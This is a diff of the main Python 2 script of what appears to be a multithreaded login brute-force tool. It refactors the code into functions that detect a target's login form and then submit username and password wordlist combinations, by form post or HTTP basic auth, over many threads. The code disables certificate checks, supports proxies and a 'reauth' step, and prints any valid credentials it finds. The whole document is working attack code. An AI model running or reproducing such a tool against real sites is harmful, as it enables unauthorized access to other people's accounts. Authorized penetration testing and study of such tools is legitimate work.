@@ -1,203 +1,212 @@
 #!/usr/bin/python
 
-# CHECK IMPORTING MODULES
+# def check_import():
+# 	try:
+# 		import sys, threading, os, ssl, time
+# 		import requests, mechanize, re
 
-try:
-	import sys, ssl, time, mechanize, re, threading, os, requests
-	from core import actions, utils, tbrowser, options
-	from modules import loginbrute, httpget
+# 	except ImportError as error:
+# 		print(error)
+# 		print("Please install libraries")
+# 		return False
 
-except ImportError as err:
-	print(err)
-	sys.exit("[x] Error while importing modules")
-
-# A FIX FOR FORM HASH UTF8
-# https://stackoverflow.com/a/33025422
-reload(sys)
-sys.setdefaultencoding('utf8')
-
-
-def main(optionURL, setOptions, optionRunMode, setRunOptions, optionReauth):
+# 	try:
+# 		from core import actions, utils, tbrowser, options
+# 		from modules import loginbrute, httpget
+# 		from extras import getproxy, reauth
+# 		import data, reports
 	
-	def do_job(jobs, trying, total):
-		for job in jobs:
-			job.start()
+# 	except Exception as error:
+# 		print("Can't find project's module")
+# 		print(error)
+# 		return False
 
-		for job in jobs:
-			utils.progress_bar(trying, total)
-			trying += 1
-			job.join()
-		
-		return trying
+# 	return True
 
-	########################## SSL
-	#	https://stackoverflow.com/a/35960702
-	#
-	########################## End ssl
-	try:
-		_create_unverified_https_context = ssl._create_unverified_context
-	except AttributeError:
-		# Legacy Python that doesn't verify HTTPS certificates by default
-		pass
-	else:
-		# Handle target environment that doesn't support HTTPS verification
-		ssl._create_default_https_context = _create_unverified_https_context
-
-	try:
-		from Queue import Queue
-	except ImportError:
-		from queue import Queue
-	
-	result = Queue()
-
-
-	# BUG bad memory management
-	
-	optionUserlist, optionThreads, optionPasslist = setOptions.values()
-	optionProxy, optionReport, optionVerbose = setRunOptions.values()
-		
-	try:
-		optionUserlist = optionUserlist.split("\n")
-	except:
-		pass
-
-	try:
-		optionPasslist = optionPasslist.split("\n")
-	except:
-		pass
-
-	# get login form info 
-	# call brute
-	
-	IS_REGULAR = True
-	
-
-	# IF NOT HTTP BASIC AUTHENTICATION, CHECK RESULT AND PARSE LOGIN FORM
-	proc = tbrowser.startBrowser()
-	#proc.addheaders = [('User-Agent', tbrowser.useragent())]
-
-	if optionRunMode not in ["--httpget"]:
-
+def checkTarget(opts):
+	if opts.attack_mode != "--httpget":
 		try:
+			proc = tbrowser.startBrowser()
 			utils.printf("[+] Checking connection...")
-			proc.open(optionURL)
-			utils.printf("[*] Get page: ['%s']" %(proc.title()), "good")
-			if proc.geturl() != optionURL:
-				utils.printf("[*] Website directs to: %s" %(proc.geturl()), "norm")
-			#TODO PROXY
-			utils.printf("[+] Connect success! Detecting login form....")
+			proc.open(opts.url)
+			if proc.geturl() != opts.url:
+				utils.printf(
+					"[*] Website directs to: %s" %(proc.geturl()),
+					"norm"
+				)
+			if opts.run_options["--verbose"]:
+				utils.printf(
+					"[*] %s" %(proc.title()),
+					"good"
+				)
+			utils.printf("[+] Connect success! Analyzing login form....")
 			loginInfo = tbrowser.parseLoginForm(proc.forms())
-
-		except Exception as err:
-			utils.die("[x] Connection error. Exit!", err)
-
+		
+		except Exception as error:
+			utils.die(
+				"[x] Runtime error: Target analyzing error!",
+				error
+			)
+		
 		finally:
 			proc.close()
+			try:
+				return loginInfo
+			except:
+				return None
 
-		try:
-			if not loginInfo:
-				utils.die("[x] URL error", "No login field found")
-			
-			else:
-				if actions.size_o(loginInfo[1]) == 1: # Password checking only
-					if optionVerbose:
-						utils.printf("[*] Form ID: %s\n  [*] Password field: %s"
-							%(loginInfo[0], loginInfo[1][0]), "good")
-					del optionUserlist[:]
-					IS_REGULAR = False
+def _http_get(options):
+	from modules import httpget
+	import Queue
+	result = Queue.Queue()
 
-				elif actions.size_o(loginInfo[1]) == 2:
-					if optionVerbose:
-						utils.printf("[*] Form ID: %s\n"
-							"   [*] Username field: %s\n"
-							"   [*] Password field: %s"
-							%(loginInfo[0], loginInfo[1][1], loginInfo[1][0]), "good")
-				utils.printf("[+] Login form detected! Starting attack...")
+	def run_threads(threads):
+		for thread in threads:
+			thread.start()
+		for thread in threads:
+			thread.join()
 
-		except Exception as err:
-			utils.die("[x] Getting login information error", err)
+	# TODO add check login
 
-			
-	#### END OF CHECKING TARGET
-	
-	
-	sizePasslist = actions.size_o(optionPasslist)
-	sizeUserlist = actions.size_o(optionUserlist)
-	total, trying = sizeUserlist * sizePasslist, 0
-
-	workers = []
-	
-	utils.printf("[+] Task counts: %s tasks" %(total))
-
-	############################
-	#	Setting up threads
-	############################
-	
 	try:
-		for password in optionPasslist:
-			for username in optionUserlist:
-				username = username.replace("\n", "")
-				password = password.replace("\n", "")
+		tasks = actions.size_o(options.passwd) * actions.size_o(options.username)
+		utils.printf("[+] Task counts: %s tasks" %(tasks))
 
-				####
-				#	IF HAVE ENOUGH THREAD, DO IT ALL
-				###
-				if actions.size_o(workers) == optionThreads:
-					trying = do_job(workers, trying, total)
+		workers = []
+
+		for username in options.username:
+			for password in options.passwd:
+				if actions.size_o(workers) == options.threads:
+					run_threads(workers)
 					del workers[:]
 
-				if optionRunMode == "--brute":
-					worker = threading.Thread(
-						target = loginbrute.submit,
-						args = (
-							optionURL, [password, username],
-							optionProxy, optionVerbose, loginInfo, result, False
-						)
-					)
-				elif optionRunMode == "--httpget":
-					worker = threading.Thread(
-						target = httpget.submit,
-						args = (
-							optionURL, username, password,
-							optionProxy, optionVerbose, result
-						)
-					)
-				worker.daemon = True
+				worker = threading.Thread(
+					target = httpget.submit,
+					args = (options, username, password, result)
+				)
 				workers.append(worker)
-	
-	######### END SETTING UP THREADS ################
-		
-		#DO ALL LAST TASKs
-		trying = do_job(workers, trying, total)
+				worker.daemon = True
+
+		run_threads(workers)
 		del workers[:]
 
-	### CATCH ERRORS ###
-	except KeyboardInterrupt:# as error:
-		# TODO: kill running threads here
-		utils.die("[x] Terminated by user!", "KeyboardInterrupt")
+	except KeyboardInterrupt:
+		utils.printf("[x] Terminated by user!", "bad")
 
-	except SystemExit:# as error
-		utils.die("[x] Terminated by system!", "SystemExit")
+	except SystemExit:
+		utils.printf("[x] Terminated by system!", "bad")
 
 	except Exception as error:
 		utils.die("[x] Runtime error", error)
 
-	### ALL TASKS DONE ####
 	finally:
-		"""
-			All threads have been set daemon
-			Running threads should be stopped after main task done
-		"""
-		############################################
-		#	Get result
-		#
-		############################################
+		credentials = list(result.queue)
+		if actions.size_o(credentials) == 0:
+			utils.printf("[-] No match found!", "bad")
+						
+		else:
+			utils.printf(
+				"\n[*] %s valid password[s] found:\n" %(
+					actions.size_o(credentials)
+				),
+				"norm"
+			)
+			utils.print_table(("Username", "Password"), *credentials)
+			utils.printf("")
+		return credentials
 
+def _login_brute(options):
+	import Queue
+	result = Queue.Queue()
+
+	def run_threads(threads):
+		for thread in threads:
+			thread.start()
+		for thread in threads:
+			thread.join()
+
+	loginInfo = checkTarget(options)
+
+	if not loginInfo:
+		utils.die(
+			"[x] URL error",
+			"No login form"
+		)
+
+	else:
 		try:
+			from modules import loginbrute
+			if actions.size_o(loginInfo[1]) == 1:
+				tasks = actions.size_o(options.passwd)
+
+				if options.verbose:
+					utils.printf("[*] Form ID: %s\n  [*] Password field: %s"
+						%(loginInfo[0], loginInfo[1][0]), "good")
+
+				utils.printf("[+] Login form detected! Starting attack...")
+				utils.printf("[+] Task counts: %s tasks" %(tasks))
+
+				workers = []
+				for password in options.passwd:
+					if actions.size_o(workers) == options.threads:
+						run_threads(workers)
+						del workers[:]
+			
+					worker = threading.Thread(
+						target = loginbrute.submit,
+						args = (options, loginInfo, [password], result)
+					)
+					workers.append(worker)
+					worker.daemon = True
+				
+				run_threads(workers)
+				del workers[:]
+
+			elif actions.size_o(loginInfo[1]) == 2:
+
+				tasks = actions.size_o(options.passwd) * actions.size_o(options.username)
+
+				if options.verbose:
+					utils.printf("[*] Form ID: %s\n"
+						"   [*] Username field: %s\n"
+						"   [*] Password field: %s"
+						%(loginInfo[0], loginInfo[1][1], loginInfo[1][0]), "good")
+
+				utils.printf("[+] Login form detected! Starting attack...")
+				utils.printf("[+] Task counts: %s tasks" %(tasks))
+
+				workers = []
+
+				for username in options.username:
+					for password in options.passwd:
+						if actions.size_o(workers) == options.threads:
+							run_threads(workers)
+							del workers[:]
+
+						worker = threading.Thread(
+							target = loginbrute.submit,
+							args = (options, loginInfo, [password, username], result)
+						)
+						workers.append(worker)
+						worker.daemon = True
+
+				run_threads(workers)
+				del workers[:]
+				
+		except KeyboardInterrupt:
+			utils.printf("[x] Terminated by user!", "bad")
+
+		except SystemExit:
+			utils.printf("[x] Terminated by system!", "bad")
+
+		except Exception as error:
+			utils.die("[x] Runtime error", error)
+
+		finally:
 			credentials = list(result.queue)
 			if actions.size_o(credentials) == 0:
 				utils.printf("[-] No match found!", "bad")
-				
+							
 			else:
 				utils.printf(
 					"\n[*] %s valid password[s] found:\n" %(
@@ -205,63 +214,66 @@ def main(optionURL, setOptions, optionRunMode, setRunOptions, optionReauth):
 					),
 					"norm"
 				)
-
-				if IS_REGULAR:
+				if "--reauth" not in options.extras:
 					utils.print_table(("Username", "Password"), *credentials)
-					utils.printf("")
-					
-					if optionReauth:
-						from extras import reauth
-						reauth.run(optionURL, credentials, optionThreads,
-							optionProxy, optionVerbose)
 				else:
-					if optionRunMode != "--sqli":
-						utils.print_table(("", "Password"), *credentials)
-					else:
-						utils.print_table(("Payload", ""), *credentials) # TODO: test more
-			
-			
-			### CREATE REPORT ####
-			if optionReport:
-				try:
-					import reports
+					utils.print_table(("Target", "Username", "Password"), *credentials)
+				utils.printf("")
+			return credentials
 
-					optionProxy = "True" if optionProxy else "False"
-					report_name = "%s_%s" %(
-						time.strftime("%Y.%m.%d_%H.%M"), optionURL.split("/")[2]
-					)
-					report_path = "%s/%s.txt" %(reports.__path__[0], report_name)
-					
-					reports.makeReport(
-						utils.report_banner(
-							optionURL,
-							optionRunMode,
-							optionProxy,
-							optionThreads,
-							credentials,
-							report_name,
-							runtime,
-							IS_REGULAR),
-						report_path)
-					
-					utils.printf("\n[*] Report file at:\n%s" %(report_path), "good")
-					
-				except Exception as err:
-					utils.printf("[x] Error while creating report: %s" %(err), "bad")
-						
-		except Exception as err:
-			utils.printf("\n[x] Error while getting result.\n", "bad")
-			utils.printf(err, "bad")
-
-
-		sys.exit(0)
 
 if __name__ == "__main__":
+	#if check_import():
+		# IMPORT GLOBALY
+	import sys, time, threading
+	from core import utils, options, actions, tbrowser
+
 	try:
+		# Setting new session
 		runtime = time.time()
-		main(*options.getUserOptions())
-	except Exception as err:
-		utils.die("", err)
+		reload(sys)
+		sys.setdefaultencoding('utf8')
+
+		# Get options
+		options = options.ParseOptions()
+
+		if options.help == True:
+			from core import helps
+			helps.print_help()
+		else:
+			actions.verify_url(options)
+
+			actions.verify_options(options)
+
+			# Print start banner
+			utils.printf(utils.start_banner(options))
+
+			# Ready options
+
+			# check user options, mix it together to start attack
+			# BUG does not get new proxy list
+			if "--getproxy" in options.extras:
+				from extras import getproxy
+				getproxy.main(options)
+
+			else:
+				if options.attack_mode != "--httpget":
+					result = _login_brute(options)
+				else:
+					result = _http_get(options)
+
+			if "--reauth" in options.extras:
+				from extras import reauth
+				reauth.run(options, result)
+			# Report
+
+	except Exception as error:
+		utils.die("[x] Program stopped", error)
+
 	finally:
 		runtime = time.time() - runtime
-		utils.printf("\n[*] Time elapsed: %0.5f [s]\n" %(runtime), "good")
+			
+		utils.printf(
+			"\n[*] Time elapsed: %0.4f [s]\n" %(runtime),
+			"good"
+		)
